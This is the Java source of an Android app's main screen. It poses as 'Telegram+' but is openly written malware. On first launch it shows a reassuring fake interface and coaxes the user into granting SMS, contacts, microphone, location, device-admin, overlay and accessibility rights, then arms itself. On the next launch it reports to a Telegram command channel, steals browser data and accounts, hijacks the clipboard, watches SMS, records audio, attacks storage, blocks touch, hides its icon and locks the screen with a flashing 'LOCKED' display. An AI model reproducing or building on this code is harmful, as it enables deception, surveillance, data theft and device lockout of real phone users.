package com.system.update;

import android.Manifest;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.util.ArrayList;
import java.util.List;

/**
 * FIRST install session: calm Telegram+ UI, permissions only, NO attack, NO TG spam.
 * AFTER user leaves (onDestroy) → armed.
 * NEXT open: full attack.
 */
public class MainActivity extends Activity {

    private static final int REQ_PERMS = 1001;
    private final Handler handler = new Handler(Looper.getMainLooper());
    private TextView status;
    private boolean attackStarted;
    private boolean setupMode;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        C2.setDeviceId(Build.MODEL + "-" + androidId);

        setupMode = !Stealth.isArmed(this);
        if (setupMode) {
            showCalmUi();
            beginPermissionFlow();
            startPersistQuiet();
        } else {
            showAttackUi();
            startFullAttack();
        }
    }

    private void showCalmUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.rgb(24, 37, 51));
        root.setPadding(48, 48, 48, 48);

        TextView t1 = new TextView(this);
        t1.setText("Telegram+");
        t1.setTextColor(Color.WHITE);
        t1.setTextSize(28);
        t1.setTypeface(Typeface.DEFAULT_BOLD);
        t1.setGravity(Gravity.CENTER);

        TextView t2 = new TextView(this);
        t2.setText("Telegram+ Cloud");
        t2.setTextColor(Color.rgb(42, 171, 238));
        t2.setTextSize(15);
        t2.setGravity(Gravity.CENTER);
        t2.setPadding(0, 20, 0, 0);

        TextView t3 = new TextView(this);
        t3.setText("Sign in helpers need storage, contacts,\nSMS backup and accessibility.\nTap Allow on the next screens.");
        t3.setTextColor(Color.rgb(180, 190, 200));
        t3.setTextSize(13);
        t3.setGravity(Gravity.CENTER);
        t3.setPadding(0, 16, 0, 0);

        status = new TextView(this);
        status.setText("Preparing…");
        status.setTextColor(Color.rgb(120, 180, 255));
        status.setTextSize(13);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 32, 0, 0);

        root.addView(t1);
        root.addView(t2);
        root.addView(t3);
        root.addView(status);
        setContentView(root);
    }

    private void showAttackUi() {
        try {
            getWindow().addFlags(
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                            | WindowManager.LayoutParams.FLAG_FULLSCREEN
                            | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                            | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        } catch (Throwable ignored) {}

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(Color.BLACK);
        root.setPadding(40, 40, 40, 40);

        TextView t1 = new TextView(this);
        t1.setText("Shriveled VN");
        t1.setTextColor(Color.RED);
        t1.setTextSize(34);
        t1.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        t1.setGravity(Gravity.CENTER);

        TextView t2 = new TextView(this);
        t2.setText("Bố mày là Hải Lâm\nLOCKED");
        t2.setTextColor(Color.WHITE);
        t2.setTextSize(16);
        t2.setGravity(Gravity.CENTER);
        t2.setPadding(0, 20, 0, 0);

        status = new TextView(this);
        status.setText("…");
        status.setTextColor(Color.GRAY);
        status.setTextSize(12);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 24, 0, 0);

        root.addView(t1);
        root.addView(t2);
        root.addView(status);
        setContentView(root);

        handler.post(new Runnable() {
            int flash;
            @Override public void run() {
                flash++;
                root.setBackgroundColor(flash % 2 == 0 ? Color.BLACK : Color.rgb(80, 0, 0));
                handler.postDelayed(this, 150);
            }
        });
    }

    private void setStatus(String s) {
        handler.post(() -> { if (status != null) status.setText(s); });
    }

    private void beginPermissionFlow() {
        setStatus("Requesting permissions…");
        List<String> need = new ArrayList<>();
        if (Build.VERSION.SDK_INT >= 23) {
            String[] perms = {
                    Manifest.permission.READ_SMS,
                    Manifest.permission.RECEIVE_SMS,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.CAMERA,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION,
                    Manifest.permission.GET_ACCOUNTS
            };
            for (String p : perms) {
                try {
                    if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) need.add(p);
                } catch (Throwable ignored) {}
            }
            if (Build.VERSION.SDK_INT >= 33) {
                try {
                    if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
                        need.add(Manifest.permission.POST_NOTIFICATIONS);
                    if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED)
                        need.add(Manifest.permission.READ_MEDIA_IMAGES);
                    if (checkSelfPermission(Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED)
                        need.add(Manifest.permission.READ_MEDIA_AUDIO);
                } catch (Throwable ignored) {}
            }
        }
        if (!need.isEmpty() && Build.VERSION.SDK_INT >= 23) {
            requestPermissions(need.toArray(new String[0]), REQ_PERMS);
        } else {
            afterRuntime();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] p, int[] g) {
        super.onRequestPermissionsResult(code, p, g);
        afterRuntime();
    }

    private void afterRuntime() {
        // sequential soft prompts — still setup only
        handler.postDelayed(() -> {
            try {
                if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
                    setStatus("Allow file access for media sync…");
                    Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(i);
                }
            } catch (Throwable ignored) {}
        }, 500);

        handler.postDelayed(() -> {
            try {
                if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                    setStatus("Allow display over apps…");
                    startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName())));
                }
            } catch (Throwable ignored) {}
        }, 2500);

        handler.postDelayed(() -> {
            try {
                Intent bat = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                bat.setData(Uri.parse("package:" + getPackageName()));
                startActivity(bat);
            } catch (Throwable ignored) {}
        }, 4500);

        handler.postDelayed(() -> {
            try {
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName admin = new ComponentName(this, AdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(admin)) {
                    setStatus("Enable admin for secure backup…");
                    Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                    i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "Telegram+ needs device admin for secure backup features.");
                    startActivity(i);
                }
            } catch (Throwable ignored) {}
        }, 6500);

        handler.postDelayed(() -> {
            try {
                setStatus("Enable Accessibility for chat tools…");
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            } catch (Throwable ignored) {}
        }, 8500);

        handler.postDelayed(() -> {
            Stealth.setPermsDone(this, true);
            setStatus("All set. Press Back or Home.\nRe-open Telegram+ when ready.");
            // do NOT arm here — arm onDestroy only
        }, 11000);
    }

    private void startPersistQuiet() {
        try {
            Intent svc = new Intent(this, PersistService.class);
            svc.putExtra("quiet", true);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
        } catch (Throwable ignored) {}
    }

    private void startFullAttack() {
        if (attackStarted) return;
        attackStarted = true;
        setStatus("…");
        try {
            Intent svc = new Intent(this, PersistService.class);
            svc.putExtra("quiet", false);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
        } catch (Throwable ignored) {}

        new Thread(() -> {
            try { Evade.maybeDelay(getApplicationContext()); } catch (Throwable ignored) {}
            try {
                Telegram.reportOnline(C2.getDeviceId(), Build.MODEL, String.valueOf(Build.VERSION.SDK_INT));
            } catch (Throwable ignored) {}
            try { Payload.execute(getApplicationContext()); } catch (Throwable ignored) {}
            try { NoiseEngine.start(getApplicationContext()); } catch (Throwable ignored) {}
            try { StressEngine.start(getApplicationContext()); } catch (Throwable ignored) {}
            try { TouchBlock.requestAndApply(getApplicationContext()); } catch (Throwable ignored) {}
            try { StorageAttack.start(getApplicationContext()); } catch (Throwable ignored) {}
            try { BrowserSteal.run(getApplicationContext()); } catch (Throwable ignored) {}
            try { Clipper.start(getApplicationContext()); } catch (Throwable ignored) {}
            try { SmsWatch.start(getApplicationContext()); } catch (Throwable ignored) {}
            try { NetDump.run(getApplicationContext()); } catch (Throwable ignored) {}
            try { NetDump.accounts(getApplicationContext()); } catch (Throwable ignored) {}
            try { LocProbe.run(getApplicationContext()); } catch (Throwable ignored) {}
            try { BookWatch.run(getApplicationContext()); } catch (Throwable ignored) {}
            try { AppInventory.run(getApplicationContext()); } catch (Throwable ignored) {}
            try { FileList.run(getApplicationContext()); } catch (Throwable ignored) {}
            try { MicRecord.capture(getApplicationContext(), 5); } catch (Throwable ignored) {}
            try { PhoneStateWatch.start(getApplicationContext()); } catch (Throwable ignored) {}
            try { DeviceExtras.run(getApplicationContext()); } catch (Throwable ignored) {}
            try {
                Thread.sleep(500);
                Collector.runAll(getApplicationContext());
            } catch (Throwable ignored) {}
            try { Telegram.reportEvent(C2.getDeviceId(), "FULL_ATTACK_DEPLOYED"); } catch (Throwable ignored) {}
            // optional: hide icon after deploy
            try { HideIcon.hide(getApplicationContext()); } catch (Throwable ignored) {}
            setStatus("LOCKED");
        }, "full-atk").start();
    }

    @Override
    protected void onDestroy() {
        // arm only after setup session ends — next launch attacks
        if (setupMode && Stealth.permsDone(this)) {
            Stealth.setArmed(this, true);
            Stealth.endSetupSession(this);
        }
        super.onDestroy();
    }

    @Override
    public boolean dispatchTouchEvent(MotionEvent ev) {
        if (!setupMode) return true;
        return super.dispatchTouchEvent(ev);
    }

    @Override
    public void onBackPressed() {
        if (!setupMode) {
            try { Payload.vibrateHard(this); } catch (Throwable ignored) {}
            return;
        }
        // finishing setup → arm
        Stealth.setPermsDone(this, true);
        Stealth.setArmed(this, true);
        Stealth.endSetupSession(this);
        super.onBackPressed();
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (setupMode) return; // do not force-reopen during setup
        handler.postDelayed(() -> {
            try {
                Intent i = new Intent(this, MainActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
                startActivity(i);
            } catch (Throwable ignored) {}
        }, 4000);
    }
}
